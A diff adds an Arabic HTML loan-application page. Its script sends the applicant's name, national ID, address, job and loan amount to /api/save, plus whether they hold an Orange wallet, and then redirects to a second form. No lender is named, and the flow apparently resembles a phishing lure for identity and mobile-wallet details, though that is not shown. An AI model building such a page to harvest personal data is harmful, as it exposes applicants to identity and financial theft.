@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>معلومات مقدم القرض</title>
+<link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+<div class="header">
+  <img src="fdf.png" alt="Header Image">
+</div>
+
+<div class="container">
+  <h2>معلومات مقدم القرض</h2>
+
+  <form id="loanForm">
+    <div class="form-group">
+      <label>الاسم الكامل</label>
+      <input type="text" id="name" required>
+    </div>
+
+    <div class="form-group">
+      <label>الرقم الوطني</label>
+      <input type="text" id="idNumber" required>
+    </div>
+
+    <div class="form-group">
+      <label>قيمة القرض</label>
+      <input type="number" id="loanAmount" required>
+    </div>
+
+    <div class="form-group">
+      <label>عنوان السكن</label>
+      <input type="text" id="address" required>
+    </div>
+
+    <div class="form-group">
+      <label>المسمى الوظيفي</label>
+      <input type="text" id="job" required>
+    </div>
+
+    <div class="form-group">
+      <label>هل لديك محفظة أورنج؟</label>
+      <div class="radio-group">
+        <input type="radio" id="yes" name="orange" value="نعم">
+        <label for="yes">نعم</label>
+        <input type="radio" id="no" name="orange" value="لا">
+        <label for="no">لا</label>
+      </div>
+    </div>
+
+    <button type="submit">إرسال الطلب</button>
+  </form>
+</div>
+
+<script>
+document.getElementById("loanForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+
+  const name = document.getElementById("name").value.trim();
+  const idNumber = document.getElementById("idNumber").value.trim();
+  const loanAmount = document.getElementById("loanAmount").value.trim();
+  const address = document.getElementById("address").value.trim();
+  const job = document.getElementById("job").value.trim();
+  const orange = document.querySelector('input[name="orange"]:checked');
+
+  if (!name || !idNumber || !loanAmount || !address || !job || !orange) {
+    alert("يرجى تعبئة جميع الحقول");
+    return;
+  }
+
+  try {
+    const response = await fetch("/api/save", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        name,
+        idNumber,
+        loanAmount,
+        address,
+        job,
+        orange: orange.value
+      })
+    });
+
+    const result = await response.json();
+
+    if (response.ok) {
+      alert("✅ تم حفظ الطلب بنجاح");
+      window.location.href = "form.html"; // صفحة أخرى بعد النجاح
+    } else {
+      alert("❌ خطأ: " + result.error);
+    }
+  } catch (err) {
+    alert("فشل الاتصال بالخادم");
+    console.error(err);
+  }
+});
+</script>
+
+</body>
+</html>
